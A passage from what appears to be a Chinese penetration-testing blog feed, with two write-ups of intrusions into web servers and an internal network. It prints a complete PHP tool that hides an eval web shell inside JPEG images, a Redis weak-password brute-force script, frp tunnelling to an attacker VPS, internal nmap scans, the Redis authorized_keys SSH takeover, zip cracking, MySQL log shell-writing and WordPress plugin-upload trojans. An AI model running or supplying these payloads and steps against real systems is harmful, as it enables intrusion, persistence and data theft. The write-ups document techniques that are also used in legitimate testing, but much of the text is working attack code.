class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   4.保存图片之后，利用脚本在里面进行加shell</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">    &#x2F;*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;</span><br><span class="line"></span><br><span class="line">    *&#x2F;</span><br><span class="line">    &#x2F;&#x2F; $miniPayload &#x3D; $argv[2];</span><br><span class="line">    $miniPayload &#x3D; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;; &#x2F;&#x2F;在这里进行加木马</span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;</span><br><span class="line">        die(&#39;php-gd is not installed&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize &#x3D; $pad;</span><br><span class="line">        $dis &#x3D; new DataInputStream($argv[1]);</span><br><span class="line">        $outStream &#x3D; file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes &#x3D; 0;</span><br><span class="line">        $correctImage &#x3D; TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;</span><br><span class="line">            die(&#39;Incorrect SOI marker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;</span><br><span class="line">            $marker &#x3D; $dis-&gt;readByte();</span><br><span class="line">            $size &#x3D; $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;</span><br><span class="line">                $startPos &#x3D; $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp &#x3D; </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !&#x3D;&#x3D; 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos &#x3D; $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize &#x3D; $stopPos - $startPos;</span><br><span class="line">                    $outStream &#x3D; </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream &#x3D; $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#39;Success!&#39;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#39;payload_&#39;.$argv[1]);</span><br><span class="line">    die(&#39;Something\&#39;s wrong&#39;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage &#x3D; TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage &#x3D; FALSE;</span><br><span class="line">        if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes &#x3D; (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;</span><br><span class="line">            $this-&gt;binData &#x3D; &#39;&#39;;</span><br><span class="line">            $this-&gt;order &#x3D; $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);</span><br><span class="line">                $this-&gt;binData &#x3D; file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData &#x3D; $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size &#x3D; strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#39;End Of File&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte &#x3D; substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#39;End Of File&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short &#x3D; substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>放入有php环境中，运行:php exp.php *.jpg，即可得到绕过GD的图片马，再将其改为php文件进行上传</code></pre></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?<span class="keyword">case</span>=tool&amp;act=cut_image </span><br><span class="line">pic=1ftp://*.*.*.*/*.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/3.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>天下武功，无坚不摧，唯快不破，是时候祭出蚁剑了</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/4.png"></p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/5.png"></p><p>这台机子是在内网，加上我也不会linux提权，只能代理出来看看内网有没有其他机子</p><p>我这里使用frp这一代理工具，将其上传到目标服务器</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/6.png"></p><p>server_addr为VPS地址，port则是监听端口</p><p>配置好之后将其上传到目标，并chmod +x frpc，赋予执行权限</p><p>VPS中的</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/7.png"></p><p>赋予执行权限，运行</p><p>蚁剑中运行frpc</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/8.png"></p><h1 id="kali扫描内网"><a href="#kali扫描内网" class="headerlink" title="kali扫描内网"></a>kali扫描内网</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>修改好之后进行保存,使用nmap进行扫描常见的端口进行探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT sV -Pn -n 172.20.0.1-255 -p 80,8080,445,3306,1433,7001,6379,9090,50000,50030,7002,3389,21,22</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/10.png"></p><p>发现172.20.0.2这台服务器开放6379端口，可以尝试是否存在redis未授权访问</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/11.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Author: r0cky</span></span><br><span class="line"><span class="string">@Time: 2019/9/2-17:35</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">passwds = [<span class="string">&#x27;redis&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;oracle&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;p@ssw0rd&#x27;</span>,<span class="string">&#x27;abc123!&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;abc123&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">ip, port, timeout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&quot;[INFO] connecting &quot;</span> + ip + <span class="string">u&quot;:&quot;</span> + port</span><br><span class="line">        s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&quot;[INFO] connected &quot;</span>+ip+<span class="string">u&quot;:&quot;</span>+port+<span class="string">u&quot; hacking...&quot;</span></span><br><span class="line">        s.send(<span class="string">&quot;INFO\r\n&quot;</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u&quot;[HACKED] 未授权访问&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Authentication&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> passwd <span class="keyword">in</span> passwds:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">                s.send(<span class="string">&quot;AUTH %s\r\n&quot;</span> %(passwd))</span><br><span class="line">                <span class="comment"># print u&quot;[HACKING] hacking to passwd --&gt; &quot;+passwd</span></span><br><span class="line">                result = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">u&quot;[HACKED] 存在弱口令，密码：%s&quot;</span> % (passwd)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(e.message) != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">u&quot;[ERROR] &quot;</span>+e.message</span><br><span class="line">        <span class="keyword">return</span> <span class="string">u&quot;[INFO] 目标Redis服务，暂不存在未授权和弱口令漏洞！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># default Port</span></span><br><span class="line">    port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">        port=sys.argv[<span class="number">2</span>]</span><br><span class="line">    result = check(ip,port, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> result</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;HACKED&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&quot;[END] Start your hacking journey !!!&quot;</span></span><br></pre></td></tr></table></figure><h1 id="kali安装redis"><a href="#kali安装redis" class="headerlink" title="kali安装redis"></a>kali安装redis</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.3.tar.gz，下载</span><br><span class="line">tar -zxvf redis-2.8.3.tar.gz，解压</span><br><span class="line"><span class="built_in">cd</span> redis-2.8.3/</span><br><span class="line">make， 编译</span><br></pre></td></tr></table></figure><h1 id="redis漏洞利用"><a href="#redis漏洞利用" class="headerlink" title="redis漏洞利用"></a>redis漏洞利用</h1><p>修改frpc.ini，将172.20.0.2的6379转发到VPS中的6379中</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/12.png"></p><p>修改完成之后，重新启动过一次</p><p>生成一个公钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/13.png"></p><p>默认情况下，生成后在/root/.ssh 目录下，将生成的公钥的值写入目标服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</span><br></pre></td></tr></table></figure><p>查看是否生成</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/14.png"></p><p>将这个文件写入进去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/foo.txt | /root/redis-2.8.3/src/redis-cli -h VPS -p 6379 -x set crackit</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/15.png"></p><p>连接进去，将目录设置为 /root/.ssh/ 目录后，再将备份文件名设置为 <code>authorized_keys</code>，通过 save 指令即可写入文件</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/16.png"></p><p>最后再修改frpc.ini，进行转发22端口</p><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/17.png"></p><p>重新启动frpc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 669 root@VPS -i /root/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/18.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次面试靶场getshell</title>
      <link href="2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/"/>
      <url>2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨晚我艺哥发了一个别人面试用的靶场</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/1.png"></p><p>哈哈，昨晚太晚了，就没日</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>拿到URL，当然是先访问瞅瞅了</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/2.png"></p><p>看到这个B样，心想只能扫扫目录和端口了吧</p><p>话不多说，当即开干</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/3.png"></p><p>扫描目录的话，推荐这个工具dirmap，挺不错的，扫出了这四个结果，不慌不慌，逐一访问瞅瞅</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://*sec.com/index.html</span><br><span class="line">http://*sec.com/info.php --&gt;phpinfo</span><br><span class="line">http://*sec.com/nginx_status --&gt; nginx的东西，具体的作用暂时不懂</span><br><span class="line">http://*sec.com/pma/index.php --&gt; phpmyadmin</span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/4.png"></p><p>看到这个玩意，立马试了一下弱口令，简单的root尝试无果，想到爆破，但是我的工具不给力呀，随手找我白神要了一个爆破phpmyadmin的工具</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/5.png"></p><p>最后爆破无果，就用御剑扫描了一下全端口</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/6.png"></p><p>毛都没有，不知道是不是因为这个服务器是在美国的原因，当时没挂梯子</p><p>昨晚依稀记得艺哥说这是一个wp的站，随手在URL中加了wp</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/7.png"></p><p>想爆破一下弱口令来着，但是吧，wp的密码一般都是很复杂的，这个想法也就作罢</p><p>到这里感觉没啥思路，只能叫艺哥给提示了哈哈，最后他给了一个网站的备份URL</p><p>我日，当时一看到，怎么没想到用7kb那个扫描器扫一下，7kb挺好的地方就是可以根据你所扫描的网站名去组合字典扫描源码备份</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/8.png"></p><p>果不其然，这不屁颠屁颠的去下载源码了</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/9.png"></p><p>真香，刚想打开，要密码哈哈哈，小问题小问题，密码应该不会太难，用kali里面的工具爆破一下</p><p><strong>第一种方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># zip2john 1.zip &gt;&gt; 1.txt</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># john 1.txt</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/10.png"></p><p>但是这个方法不行，不知道为啥</p><p><strong>第二种方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># fcrackzip -D -u -p top6000.txt 1.zip，这里要指定你的字典</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/11.png"></p><p>拿到密码解压压缩包，在wp配置文件中找mysql账号密码</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/12.png"></p><p>得到账号密码立即登录phpmyadmin</p><p>在之前的phpinfo得到绝对路径</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/13.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;secure_file_priv&#x27;</span>，没戏</span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/14.png"></p><p>写入没戏，再看看日志写入</p><p><strong>常规步骤</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一步手动开启日志 set global general_log&#x3D;&#39;on&#39; &#x2F;&#x2F;首先设置为on </span><br><span class="line"></span><br><span class="line">第二步 修改日志路径 set global general_log_file &#x3D;&quot;&#x2F;home&#x2F;wwwroot&#x2F;default&#x2F;1.php&quot; </span><br><span class="line"></span><br><span class="line">然后 查看是否开启成功 show variables like &quot;general_log%&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/15.png"></p><p>然而他不给面子啊，只能修改wp的管理员密码进入后台getshell了</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/16.png"></p><p>登录之后，在插件上传处，直接上传php文件</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/17.png"></p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/18.png"></p><p>上传成功后就可以直接访问木马了，根据上传时间的年月可以知道木马所在路径为</p><p><a href="http://www.xxx.com/wp/wp-content/uploads/2020/07/2.php">http://www.xxx.com/wp/wp-content/uploads/2020/07/2.php</a></p><p>菜刀连接即可</p><p><img src="/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E9%9D%B6%E5%9C%BAgetshell/19.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次从信息泄露到密码重置-挖掘思路</title>
      <link href="2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/"/>
